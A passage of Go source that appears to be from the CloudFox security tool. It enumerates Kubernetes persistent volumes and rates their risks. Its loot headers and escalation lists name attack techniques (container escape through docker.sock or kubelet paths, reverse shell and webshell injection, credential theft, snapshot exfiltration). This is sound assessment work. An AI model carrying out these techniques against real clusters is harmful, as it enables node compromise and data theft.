package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"
	"time"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	storagev1 "k8s.io/api/storage/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

var PersistentVolumesCmd = &cobra.Command{
	Use:     "persistent-volumes",
	Aliases: []string{"pv", "pvs", "pvc", "pvcs", "volumes"},
	Short:   "Enumerate PersistentVolumes and PersistentVolumeClaims with security analysis",
	Long: `
Enumerate all PersistentVolumes and PersistentVolumeClaims including:
  - Storage classes and provisioners
  - Access modes and capacity
  - Mount paths and bound pods
  - Cloud provider volume IDs
  - Reclaim policies
  - Security analysis (HostPath risks, encryption, sensitive data, privilege escalation)

  cloudfox kubernetes persistent-volumes`,
	Run: ListPersistentVolumes,
}

type PersistentVolumesOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (p PersistentVolumesOutput) TableFiles() []internal.TableFile {
	return p.Table
}

func (p PersistentVolumesOutput) LootFiles() []internal.LootFile {
	return p.Loot
}

// PersistentVolumeFinding represents comprehensive security analysis for a volume
type PersistentVolumeFinding struct {
	// Basic Info
	PVName        string
	PVCName       string
	PVCNamespace  string
	Capacity      string
	StorageClass  string
	VolumeType    string
	CloudVolumeID string
	Provisioner   string
	Status        string

	// Security Analysis
	RiskLevel           string
	SecurityIssues      []string
	HostPathRisk        string
	DataSensitivityRisk string

	// HostPath Analysis (CRITICAL)
	IsHostPath          bool
	HostPathPath        string
	HostPathType        string
	AllowsHostRoot      bool
	AllowsEtcAccess     bool
	AllowsVarRunAccess  bool
	AllowsKubeletAccess bool
	HostPathEscalation  []string

	// Access Mode Security
	AccessModes         []string
	AllowsReadWriteMany bool
	MultiPodAccessRisk  string

	// Reclaim Policy
	ReclaimPolicy   string
	DataLeakageRisk string

	// Encryption & Security
	IsEncrypted         bool
	EncryptionType      string
	UnencryptedDataRisk string

	// Sensitive Data Detection
	SensitivePathPatterns []string
	ContainsDatabaseData  bool
	ContainsSecretData    bool
	ContainsConfigData    bool
	SensitiveDataType     string

	// Cloud Provider Security
	CloudProvider   string
	SnapshotEnabled bool

	// CSI Security
	CSIDriver         string
	CSIVolumeHandle   string
	CSISecurityIssues []string

	// Network Storage (NFS, iSCSI)
	IsNetworkStorage   bool
	NFSServer          string
	NFSPath            string
	NFSReadOnly        bool
	NetworkStorageRisk string

	// Usage Analysis
	BoundPods       []string
	BoundPodCount   int
	BoundNamespaces []string
	UnusedVolume    bool
	OrphanedVolume  bool

	// Mount Security
	MountedReadOnly     bool
	MountPaths          []string
	SensitiveMountPaths []string

	// Age
	Age               string
	CreationTimestamp string

	// Privilege Escalation
	AllowsPrivilegeEscalation bool
	EscalationPaths           []string

	// Data Exfiltration
	AllowsDataExfiltration bool
	ExfiltrationScenarios  []string

	// Attack Scenarios
	AttackPaths     []string
	Recommendations []string
}

// HostPathAnalysis represents security analysis for HostPath volumes
type HostPathAnalysis struct {
	IsHostPath          bool
	Path                string
	Type                string
	RiskLevel           string
	DangerousPath       bool
	DangerousPathReason string
	EscalationPaths     []string
	SecurityIssues      []string
}

// SensitiveDataAnalysis represents detection of sensitive data in volumes
type SensitiveDataAnalysis struct {
	ContainsSensitiveData bool
	DataType              string
	Patterns              []string
	RiskLevel             string
	SecurityIssues        []string
}

// EncryptionAnalysis represents encryption security analysis
type EncryptionAnalysis struct {
	IsEncrypted    bool
	Provider       string
	EncryptionType string
	KMSKeyID       string
	RiskLevel      string
	SecurityIssues []string
}

// ReclaimPolicyAnalysis represents reclaim policy security analysis
type ReclaimPolicyAnalysis struct {
	Policy          string
	DataLeakageRisk bool
	RiskLevel       string
	Issues          []string
}

// AccessModeAnalysis represents access mode security analysis
type AccessModeAnalysis struct {
	Modes               []corev1.PersistentVolumeAccessMode
	AllowsReadWriteMany bool
	BoundPodCount       int
	RiskLevel           string
	Issues              []string
}

// NFSSecurityAnalysis represents NFS volume security analysis
type NFSSecurityAnalysis struct {
	Server    string
	Path      string
	ReadOnly  bool
	NoAuth    bool
	RiskLevel string
	Issues    []string
}

// CSISecurityAnalysis represents CSI driver security analysis
type CSISecurityAnalysis struct {
	Driver             string
	VolumeHandle       string
	Attributes         map[string]string
	IsEncrypted        bool
	KnownVulnerability string
	RiskLevel          string
	SecurityIssues     []string
}

// StorageClassAnalysis represents storage class security analysis
type StorageClassAnalysis struct {
	Name                   string
	Provisioner            string
	VolumeBindingMode      string
	AllowVolumeExpansion   bool
	ReclaimPolicy          string
	Parameters             map[string]string
	AllowsHostPath         bool
	AllowsPrivilegedAccess bool
	RequiresEncryption     bool
	SecurityIssues         []string
	RiskLevel              string
}

// VolumeSnapshotFinding represents volume snapshot security analysis
type VolumeSnapshotFinding struct {
	Name             string
	Namespace        string
	SourcePVC        string
	SnapshotClass    string
	ReadyToUse       bool
	CreationTime     string
	SourceSensitive  bool
	ExfiltrationRisk string
	SecurityIssues   []string
	AttackScenarios  []string
}

func ListPersistentVolumes(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithTimeout()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating persistent volumes for %s", globals.ClusterName), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Get all PersistentVolumes
	pvs, err := clientset.CoreV1().PersistentVolumes().List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "persistent volumes", "", err, globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME, true)
		return
	}

	// Get all namespaces for PVC enumeration
	namespaces := shared.GetTargetNamespaces(ctx, clientset, &logger, globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)

	// Get all storage classes
	storageClasses, err := clientset.StorageV1().StorageClasses().List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "storage classes", "", err, globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME, false)
	}

	// Storage class map for quick lookup
	scMap := make(map[string]storagev1.StorageClass)
	if storageClasses != nil {
		for _, sc := range storageClasses.Items {
			scMap[sc.Name] = sc
		}
	}

	headers := []string{
		// Identity
		"PV Name",
		"PVC",
		"Namespace",
		// Specs
		"Volume Type",
		"Capacity",
		"Storage Class",
		"Access Modes",
		"Reclaim Policy",
		// Security Flags
		"Encrypted",
		"HostPath",
		"Network Storage",
		"RWX Shared",
		// Data
		"Sensitive Data",
		// Status
		"Bound Pods",
		"Orphaned",
		"Age",
	}

	var outputRows [][]string
	var findings []PersistentVolumeFinding

	// Initialize loot builder
	loot := shared.NewLootBuilder()

	// Initialize loot sections by technology type (7 sections)
	loot.Section("PV-Enum").SetHeader(`#####################################
##### PersistentVolume Enumeration
#####################################
#
# General enumeration commands for all storage resources
#`)

	loot.Section("PV-HostPath").SetHeader(`#####################################
##### HostPath Volumes
#####################################
#
# CRITICAL: HostPath volumes provide direct host filesystem access
# These are the #1 container escape vector
#
# IMPACT: Full node compromise, cluster takeover
#
# Techniques included:
# - Container escape via PVC
# - Direct hostPath pod creation
# - Path-specific exploitation (docker.sock, kubelet, etc.)
# - Credential theft and persistence
#`)

	loot.Section("PV-NFS").SetHeader(`#####################################
##### NFS/Network Storage Volumes
#####################################
#
# NFS and network-attached storage volumes
# Risk: Direct mount bypasses Kubernetes RBAC and audit logs
#
# Techniques included:
# - Direct NFS mount from attacker machine
# - Data exfiltration via direct access
# - Data tampering (if read-write)
# - Pod-based NFS access
#`)

	loot.Section("PV-RWX").SetHeader(`#####################################
##### ReadWriteMany (RWX) Volumes
#####################################
#
# Volumes shared across multiple pods (lateral movement vector)
# Risk: Compromise one pod → access all pods sharing the volume
#
# Techniques included:
# - Reverse shell injection
# - Config file poisoning
# - Webshell deployment
# - Cron/startup script injection
# - SSH key injection
# - Symlink attacks
# - Application-specific attacks
#`)

	loot.Section("PV-Cloud").SetHeader(`#####################################
##### Cloud Provider Volumes
#####################################
#
# AWS EBS, GCE PD, Azure Disk direct access
# REQUIRES: Cloud provider CLI tools and credentials
#
# Techniques included:
# - Volume inspection
# - Snapshot creation for exfiltration
# - Cross-account/cross-project access
#`)

	loot.Section("PV-Snapshots").SetHeader(`#####################################
##### Volume Snapshots
#####################################
#
# VolumeSnapshot enumeration and exploitation
# Risk: Clone sensitive data without accessing original volume
#
# Techniques included:
# - Snapshot enumeration
# - PVC restoration from snapshots
# - Data exfiltration via snapshot clone
#`)

	loot.Section("PV-Orphaned").SetHeader(`#####################################
##### Orphaned & Retain Policy Volumes
#####################################
#
# Released/unbound volumes and Retain policy risks
# Risk: Access previous tenant data, data leakage after deletion
#
# Techniques included:
# - Reclaim orphaned volumes
# - Access released volume data
# - Retain policy exploitation
#`)

	if globals.KubeContext != "" {
		loot.Section("PV-Enum").Addf("kubectl config use-context %s\n", globals.ClusterName)
	}

	// Map to track which pods use which PVCs
	pvcToPods := make(map[string][]string)
	pvcToPodsNamespaces := make(map[string][]string)

	// Get all pods across all namespaces to map PVC usage
	for _, ns := range namespaces {
		pods, err := clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, pod := range pods.Items {
				for _, volume := range pod.Spec.Volumes {
					if volume.PersistentVolumeClaim != nil {
						key := fmt.Sprintf("%s/%s", ns, volume.PersistentVolumeClaim.ClaimName)
						pvcToPods[key] = append(pvcToPods[key], pod.Name)
						pvcToPodsNamespaces[key] = append(pvcToPodsNamespaces[key], ns)
					}
				}
			}
		}
	}

	// Process PersistentVolumes
	for _, pv := range pvs.Items {
		finding := PersistentVolumeFinding{
			PVName: pv.Name,
			Status: string(pv.Status.Phase),
		}

		// Basic attributes
		if storage, ok := pv.Spec.Capacity[corev1.ResourceStorage]; ok {
			finding.Capacity = storage.String()
		} else {
			finding.Capacity = "<NONE>"
		}

		// Access modes
		for _, mode := range pv.Spec.AccessModes {
			finding.AccessModes = append(finding.AccessModes, string(mode))
			if mode == corev1.ReadWriteMany {
				finding.AllowsReadWriteMany = true
			}
		}

		// Claim
		if pv.Spec.ClaimRef != nil {
			finding.PVCName = pv.Spec.ClaimRef.Name
			finding.PVCNamespace = pv.Spec.ClaimRef.Namespace
		}

		// Storage class
		if pv.Spec.StorageClassName != "" {
			finding.StorageClass = pv.Spec.StorageClassName
		} else {
			finding.StorageClass = "<NONE>"
		}

		// Reclaim policy
		finding.ReclaimPolicy = string(pv.Spec.PersistentVolumeReclaimPolicy)

		// Age
		age := time.Since(pv.CreationTimestamp.Time)
		finding.Age = persistentVolumesFormatDuration(age)
		finding.CreationTimestamp = pv.CreationTimestamp.Format(time.RFC3339)

		// Detect volume type and cloud provider volume ID
		finding.VolumeType, finding.CloudVolumeID, finding.Provisioner = detectVolumeSource(pv.Spec.PersistentVolumeSource)

		// Get bound pods
		if finding.PVCNamespace != "" && finding.PVCName != "" {
			key := fmt.Sprintf("%s/%s", finding.PVCNamespace, finding.PVCName)
			finding.BoundPods = pvcToPods[key]
			finding.BoundPodCount = len(finding.BoundPods)
			finding.BoundNamespaces = k8sinternal.Unique(pvcToPodsNamespaces[key])
		}

		// HostPath Security Analysis
		hostPathAnalysis := analyzeHostPathSecurity(pv)
		finding.IsHostPath = hostPathAnalysis.IsHostPath
		finding.HostPathPath = hostPathAnalysis.Path
		finding.HostPathType = hostPathAnalysis.Type
		finding.AllowsHostRoot = hostPathAnalysis.DangerousPath && strings.Contains(hostPathAnalysis.DangerousPathReason, "host filesystem")
		finding.AllowsEtcAccess = hostPathAnalysis.DangerousPath && strings.Contains(hostPathAnalysis.Path, "/etc")
		finding.AllowsVarRunAccess = hostPathAnalysis.DangerousPath && strings.Contains(hostPathAnalysis.Path, "/var/run")
		finding.AllowsKubeletAccess = hostPathAnalysis.DangerousPath && strings.Contains(hostPathAnalysis.Path, "/var/lib/kubelet")
		finding.HostPathEscalation = hostPathAnalysis.EscalationPaths
		finding.SecurityIssues = append(finding.SecurityIssues, hostPathAnalysis.SecurityIssues...)
		if hostPathAnalysis.IsHostPath {
			finding.HostPathRisk = hostPathAnalysis.RiskLevel
		} else {
			finding.HostPathRisk = "None"
		}

		// Sensitive Data Detection
		sensitiveDataAnalysis := detectSensitiveData(pv, finding.PVCName, finding.StorageClass)
		finding.ContainsDatabaseData = sensitiveDataAnalysis.ContainsSensitiveData && strings.Contains(sensitiveDataAnalysis.DataType, "Database")
		finding.ContainsSecretData = sensitiveDataAnalysis.ContainsSensitiveData && strings.Contains(sensitiveDataAnalysis.DataType, "Secret")
		finding.ContainsConfigData = sensitiveDataAnalysis.ContainsSensitiveData && strings.Contains(sensitiveDataAnalysis.DataType, "Config")
		finding.SensitiveDataType = sensitiveDataAnalysis.DataType
		finding.SensitivePathPatterns = sensitiveDataAnalysis.Patterns
		finding.SecurityIssues = append(finding.SecurityIssues, sensitiveDataAnalysis.SecurityIssues...)
		if sensitiveDataAnalysis.ContainsSensitiveData {
			finding.DataSensitivityRisk = sensitiveDataAnalysis.RiskLevel
		}

		// Encryption Analysis
		encryptionAnalysis := analyzeEncryption(pv)
		finding.IsEncrypted = encryptionAnalysis.IsEncrypted
		finding.EncryptionType = encryptionAnalysis.EncryptionType
		finding.CloudProvider = encryptionAnalysis.Provider
		finding.SecurityIssues = append(finding.SecurityIssues, encryptionAnalysis.SecurityIssues...)
		if !encryptionAnalysis.IsEncrypted && sensitiveDataAnalysis.ContainsSensitiveData {
			finding.UnencryptedDataRisk = shared.RiskHigh
		}

		// Reclaim Policy Analysis
		reclaimAnalysis := analyzeReclaimPolicy(pv)
		finding.DataLeakageRisk = reclaimAnalysis.RiskLevel
		finding.SecurityIssues = append(finding.SecurityIssues, reclaimAnalysis.Issues...)

		// Access Mode Analysis
		accessModeAnalysis := analyzeAccessModes(pv, finding.BoundPods)
		finding.MultiPodAccessRisk = accessModeAnalysis.RiskLevel
		finding.SecurityIssues = append(finding.SecurityIssues, accessModeAnalysis.Issues...)

		// Network Storage Analysis
		nfsAnalysis := analyzeNFSSecurity(pv)
		finding.IsNetworkStorage = nfsAnalysis.Server != ""
		finding.NFSServer = nfsAnalysis.Server
		finding.NFSPath = nfsAnalysis.Path
		finding.NFSReadOnly = nfsAnalysis.ReadOnly
		finding.NetworkStorageRisk = nfsAnalysis.RiskLevel
		finding.SecurityIssues = append(finding.SecurityIssues, nfsAnalysis.Issues...)

		// CSI Security Analysis
		csiAnalysis := analyzeCSISecurity(pv)
		finding.CSIDriver = csiAnalysis.Driver
		finding.CSIVolumeHandle = csiAnalysis.VolumeHandle
		finding.CSISecurityIssues = csiAnalysis.SecurityIssues
		finding.SecurityIssues = append(finding.SecurityIssues, csiAnalysis.SecurityIssues...)

		// Storage Class Analysis
		if sc, exists := scMap[finding.StorageClass]; exists {
			scAnalysis := analyzeStorageClassSecurity(sc)
			finding.SecurityIssues = append(finding.SecurityIssues, scAnalysis.SecurityIssues...)
		}

		// Orphaned/Unused Volume Detection
		if pv.Status.Phase == corev1.VolumeReleased {
			finding.OrphanedVolume = true
			finding.SecurityIssues = append(finding.SecurityIssues,
				"Volume was released but not reclaimed - may contain previous tenant data")
		}
		if pv.Status.Phase == corev1.VolumeAvailable && pv.Spec.ClaimRef == nil {
			finding.UnusedVolume = true
			finding.SecurityIssues = append(finding.SecurityIssues,
				"Unbound volume available for claiming - check for old data")
		}

		// Privilege Escalation Detection
		escalationPaths := detectVolumeEscalationPaths(finding)
		finding.EscalationPaths = escalationPaths
		finding.AllowsPrivilegeEscalation = len(escalationPaths) > 0

		// Data Exfiltration Detection
		exfiltrationScenarios := detectExfiltrationScenarios(finding)
		finding.ExfiltrationScenarios = exfiltrationScenarios
		finding.AllowsDataExfiltration = len(exfiltrationScenarios) > 0

		// Attack Paths
		finding.AttackPaths = generateAttackPaths(finding)

		// Risk Scoring
		finding.RiskLevel, _ = calculateVolumeRiskScore(finding)

		// Recommendations
		finding.Recommendations = generateRecommendations(finding)

		findings = append(findings, finding)

		// Generate table row
		orphanedStr := "No"
		if finding.OrphanedVolume {
			orphanedStr = "Released"
		} else if finding.UnusedVolume {
			orphanedStr = "Unbound"
		}

		encryptedStr := "No"
		if finding.IsEncrypted {
			encryptedStr = "Yes"
		}

		// HostPath - show actual path instead of Yes/No
		hostPathStr := "<NONE>"
		if finding.IsHostPath {
			hostPathStr = finding.HostPathPath
		}

		// Network Storage - show mount point instead of Yes/No
		networkStorageStr := "<NONE>"
		if finding.IsNetworkStorage && finding.NFSServer != "" {
			networkStorageStr = fmt.Sprintf("%s:%s", finding.NFSServer, finding.NFSPath)
		}

		// RWX Shared - show detailed sharing info with namespaces
		// RWX = ReadWriteMany access mode (volume can be mounted read-write by many nodes)
		// This is a lateral movement risk: compromise one pod → access all shared data
		rwxSharedStr := "<NONE>"
		if finding.AllowsReadWriteMany {
			if finding.BoundPodCount > 1 {
				// Show pod count and namespace info for lateral movement assessment
				if len(finding.BoundNamespaces) > 1 {
					// Cross-namespace sharing = higher lateral movement risk
					rwxSharedStr = fmt.Sprintf("%d pods across %s", finding.BoundPodCount, strings.Join(finding.BoundNamespaces, ", "))
				} else if len(finding.BoundNamespaces) == 1 {
					// Single namespace sharing
					rwxSharedStr = fmt.Sprintf("%d pods in %s", finding.BoundPodCount, finding.BoundNamespaces[0])
				} else {
					rwxSharedStr = fmt.Sprintf("%d pods", finding.BoundPodCount)
				}
			} else if finding.BoundPodCount == 1 {
				// Single pod but RWX capable - potential future risk
				if len(finding.BoundNamespaces) == 1 {
					rwxSharedStr = fmt.Sprintf("1 pod in %s", finding.BoundNamespaces[0])
				} else {
					rwxSharedStr = "1 pod"
				}
			} else {
				// RWX enabled but no pods bound - available for lateral movement if claimed
				rwxSharedStr = "RWX (unbound)"
			}
		}

		pvcStr := "<NONE>"
		if finding.PVCName != "" {
			pvcStr = finding.PVCName
		}

		namespaceStr := "<NONE>"
		if finding.PVCNamespace != "" {
			namespaceStr = finding.PVCNamespace
		}

		sensitiveDataStr := "<NONE>"
		if finding.SensitiveDataType != "" {
			sensitiveDataStr = finding.SensitiveDataType
		}

		// Bound Pods - show actual pod names instead of count
		boundPodsStr := "<NONE>"
		if len(finding.BoundPods) > 0 {
			boundPodsStr = strings.Join(finding.BoundPods, ", ")
		}

		outputRows = append(outputRows, []string{
			// Identity
			finding.PVName,
			pvcStr,
			namespaceStr,
			// Specs
			finding.VolumeType,
			finding.Capacity,
			finding.StorageClass,
			strings.Join(finding.AccessModes, ","),
			finding.ReclaimPolicy,
			// Security Flags
			encryptedStr,
			hostPathStr,
			networkStorageStr,
			rwxSharedStr,
			// Data
			sensitiveDataStr,
			// Status
			boundPodsStr,
			orphanedStr,
			finding.Age,
		})

		// Generate loot content
		generateLootContent(&finding, loot)
	}

	// Enumerate volume snapshots
	generateSnapshotLoot(ctx, clientset, loot)

	// Sort by PV name
	sort.SliceStable(outputRows, func(i, j int) bool {
		return outputRows[i][0] < outputRows[j][0]
	})

	table := internal.TableFile{
		Name:   "PersistentVolumes",
		Header: headers,
		Body:   outputRows,
	}

	lootFiles := loot.Build()

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"PersistentVolumes",
		globals.ClusterName,
		"results",
		PersistentVolumesOutput{
			Table: []internal.TableFile{table},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
		return
	}

	// Count security-relevant volumes
	hostPathCount := 0
	networkStorageCount := 0
	for _, f := range findings {
		if f.IsHostPath {
			hostPathCount++
		}
		if f.IsNetworkStorage {
			networkStorageCount++
		}
	}

	if len(outputRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d volumes found (%d HostPath, %d Network Storage)", len(outputRows), hostPathCount, networkStorageCount), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
	} else {
		logger.InfoM("No persistent volumes found, skipping output file creation", globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
}

// analyzeHostPathSecurity analyzes HostPath volume security
func analyzeHostPathSecurity(pv corev1.PersistentVolume) HostPathAnalysis {
	analysis := HostPathAnalysis{
		IsHostPath: false,
	}

	if pv.Spec.HostPath == nil {
		return analysis
	}

	analysis.IsHostPath = true
	analysis.Path = pv.Spec.HostPath.Path
	if pv.Spec.HostPath.Type != nil {
		analysis.Type = string(*pv.Spec.HostPath.Type)
	}
	analysis.RiskLevel = shared.RiskHigh

	// Check dangerous paths
	dangerousPaths := map[string]string{
		"/":                         "CRITICAL - Full host filesystem access",
		"/etc":                      "CRITICAL - System configuration access",
		"/var/run/docker.sock":      "CRITICAL - Docker API access (container escape)",
		"/var/run/cri-dockerd.sock": "CRITICAL - CRI API access (container escape)",
		"/var/run/containerd":       "CRITICAL - Containerd socket access (container escape)",
		"/proc":                     "HIGH - Process introspection",
		"/sys":                      "HIGH - Kernel/system access",
		"/root":                     "HIGH - Root user home directory",
		"/var/lib/kubelet":          "CRITICAL - Kubelet secrets and certificates",
		"/var/lib/etcd":             "CRITICAL - etcd data (all cluster secrets)",
		"/var/log":                  "MEDIUM - System logs (may contain sensitive data)",
		"/home":                     "MEDIUM - User home directories",
		"/var/lib/docker":           "HIGH - Docker data directory",
		"/var/lib/containerd":       "HIGH - Containerd data directory",
		"/etc/kubernetes":           "CRITICAL - Kubernetes configuration and certificates",
		"/etc/cni":                  "MEDIUM - CNI configuration",
		"/opt/cni":                  "MEDIUM - CNI binaries",
	}

	for path, risk := range dangerousPaths {
		if strings.HasPrefix(analysis.Path, path) || analysis.Path == path {
			analysis.DangerousPath = true
			analysis.DangerousPathReason = risk
			if strings.Contains(risk, shared.RiskCritical) {
				analysis.RiskLevel = shared.RiskCritical
			}
			break
		}
	}

	if analysis.DangerousPath {
		analysis.SecurityIssues = append(analysis.SecurityIssues, analysis.DangerousPathReason)
		analysis.EscalationPaths = append(analysis.EscalationPaths,
			fmt.Sprintf("HostPath mount: %s", analysis.Path),
			"Create PVC claiming this PV",
			"Create pod with this PVC mounted",
			"Access host filesystem from container",
			"Escalate to node root access",
		)

		if strings.HasPrefix(analysis.Path, "/var/lib/kubelet") {
			analysis.EscalationPaths = append(analysis.EscalationPaths,
				"Read kubelet kubeconfig and certificates",
				"Authenticate as node to API server",
				"Escalate to cluster-admin",
			)
		}

		if strings.Contains(analysis.Path, "docker.sock") || strings.Contains(analysis.Path, "containerd") {
			analysis.EscalationPaths = append(analysis.EscalationPaths,
				"Use container runtime socket to spawn privileged container",
				"Break out of container namespace",
				"Full node compromise",
			)
		}
	} else {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("HostPath volume allows host access to: %s", analysis.Path))
	}

	return analysis
}

// detectSensitiveData detects if volume likely contains sensitive data
func detectSensitiveData(pv corev1.PersistentVolume, pvcName, storageClass string) SensitiveDataAnalysis {
	analysis := SensitiveDataAnalysis{
		ContainsSensitiveData: false,
		RiskLevel:             shared.RiskLow,
	}

	patterns := []struct {
		Pattern     string
		Type        string
		Severity    string
		Description string
	}{
		{"mysql", "Database", shared.RiskHigh, "MySQL database data"},
		{"postgres", "Database", shared.RiskHigh, "PostgreSQL database data"},
		{"mongodb", "Database", shared.RiskHigh, "MongoDB database data"},
		{"mariadb", "Database", shared.RiskHigh, "MariaDB database data"},
		{"redis", "Cache", shared.RiskMedium, "Redis cache (may contain session tokens)"},
		{"elasticsearch", "Search", shared.RiskMedium, "Elasticsearch indexed data"},
		{"backup", "Backup", shared.RiskHigh, "Backup data (may contain full system state)"},
		{"etcd", "Secrets", shared.RiskCritical, "etcd data (all cluster secrets)"},
		{"secret", "Secrets", shared.RiskCritical, "Likely contains secrets"},
		{"config", "Config", shared.RiskMedium, "Configuration files"},
		{"log", "Logs", shared.RiskLow, "Log files (may leak sensitive info)"},
		{"database", "Database", shared.RiskHigh, "Database storage"},
		{"db", "Database", shared.RiskHigh, "Database storage"},
		{"vault", "Secrets", shared.RiskCritical, "HashiCorp Vault data"},
		{"credential", "Secrets", shared.RiskCritical, "Credentials storage"},
		{"password", "Secrets", shared.RiskCritical, "Password storage"},
		{"ssh", "Credentials", shared.RiskHigh, "SSH keys"},
		{"ssl", "Certificates", shared.RiskHigh, "SSL/TLS certificates"},
		{"tls", "Certificates", shared.RiskHigh, "TLS certificates"},
		{"cert", "Certificates", shared.RiskHigh, "Certificates"},
		{"key", "Secrets", shared.RiskHigh, "Cryptographic keys"},
	}

	checkStrings := []string{
		strings.ToLower(pv.Name),
		strings.ToLower(pvcName),
		strings.ToLower(storageClass),
	}

	for _, pattern := range patterns {
		for _, str := range checkStrings {
			if strings.Contains(str, pattern.Pattern) {
				analysis.ContainsSensitiveData = true
				analysis.DataType = pattern.Type
				analysis.Patterns = append(analysis.Patterns, pattern.Pattern)
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					fmt.Sprintf("%s: %s", pattern.Type, pattern.Description))

				switch pattern.Severity {
				case shared.RiskCritical:
					analysis.RiskLevel = shared.RiskCritical
				case shared.RiskHigh:
					if analysis.RiskLevel != shared.RiskCritical {
						analysis.RiskLevel = shared.RiskHigh
					}
				case shared.RiskMedium:
					if analysis.RiskLevel != shared.RiskCritical && analysis.RiskLevel != shared.RiskHigh {
						analysis.RiskLevel = shared.RiskMedium
					}
				}
				break
			}
		}
	}

	return analysis
}

// analyzeEncryption detects encryption status
func analyzeEncryption(pv corev1.PersistentVolume) EncryptionAnalysis {
	analysis := EncryptionAnalysis{
		IsEncrypted: false,
		RiskLevel:   shared.RiskMedium,
	}

	// AWS EBS
	if pv.Spec.AWSElasticBlockStore != nil {
		analysis.Provider = "AWS EBS"
		// Note: Cannot determine encryption without AWS API call
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"AWS EBS - verify encryption with: aws ec2 describe-volumes --volume-ids "+pv.Spec.AWSElasticBlockStore.VolumeID)
	}

	// GCE PD
	if pv.Spec.GCEPersistentDisk != nil {
		analysis.Provider = "GCE PD"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"GCE PD - verify encryption with: gcloud compute disks describe "+pv.Spec.GCEPersistentDisk.PDName)
	}

	// Azure Disk
	if pv.Spec.AzureDisk != nil {
		analysis.Provider = "Azure Disk"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"Azure Disk - verify encryption with: az disk show --name "+pv.Spec.AzureDisk.DiskName)
	}

	// CSI
	if pv.Spec.CSI != nil {
		analysis.Provider = "CSI"
		if encrypted, ok := pv.Spec.CSI.VolumeAttributes["encrypted"]; ok && encrypted == "true" {
			analysis.IsEncrypted = true
			analysis.EncryptionType = "CSI Driver Encryption"
			analysis.RiskLevel = shared.RiskLow
		}
		if key, ok := pv.Spec.CSI.VolumeAttributes["encryptionKMSKeyId"]; ok {
			analysis.IsEncrypted = true
			analysis.KMSKeyID = key
			analysis.EncryptionType = "KMS"
			analysis.RiskLevel = shared.RiskLow
		}
		if !analysis.IsEncrypted {
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"CSI volume - encryption status unknown, check CSI driver configuration")
		}
	}

	// HostPath, NFS - never encrypted by default
	if pv.Spec.HostPath != nil {
		analysis.Provider = "HostPath"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"HostPath volumes are not encrypted (uses host filesystem)")
		analysis.RiskLevel = shared.RiskHigh
	}

	if pv.Spec.NFS != nil {
		analysis.Provider = "NFS"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"NFS volumes typically not encrypted in transit or at rest")
		analysis.RiskLevel = shared.RiskHigh
	}

	return analysis
}

// analyzeReclaimPolicy analyzes reclaim policy security
func analyzeReclaimPolicy(pv corev1.PersistentVolume) ReclaimPolicyAnalysis {
	policy := string(pv.Spec.PersistentVolumeReclaimPolicy)

	analysis := ReclaimPolicyAnalysis{
		Policy:          policy,
		DataLeakageRisk: false,
		RiskLevel:       shared.RiskLow,
	}

	switch policy {
	case "Retain":
		analysis.RiskLevel = shared.RiskHigh
		analysis.DataLeakageRisk = true
		analysis.Issues = append(analysis.Issues,
			"Volume will persist after PVC deletion",
			"Previous tenant data may be accessible",
			"Manual cleanup required to prevent data leakage",
		)
	case "Recycle":
		analysis.RiskLevel = shared.RiskMedium
		analysis.Issues = append(analysis.Issues,
			"Recycle policy is deprecated",
			"Basic scrub may leave data remnants",
			"Use Delete policy instead",
		)
	case "Delete":
		analysis.RiskLevel = shared.RiskLow
		// This is the secure option
	default:
		analysis.RiskLevel = shared.RiskMedium
		analysis.Issues = append(analysis.Issues, "Unknown reclaim policy: "+policy)
	}

	return analysis
}

// analyzeAccessModes analyzes access mode security
func analyzeAccessModes(pv corev1.PersistentVolume, boundPods []string) AccessModeAnalysis {
	analysis := AccessModeAnalysis{
		Modes:         pv.Spec.AccessModes,
		BoundPodCount: len(boundPods),
		RiskLevel:     shared.RiskLow,
	}

	hasRWX := false
	for _, mode := range pv.Spec.AccessModes {
		if mode == corev1.ReadWriteMany {
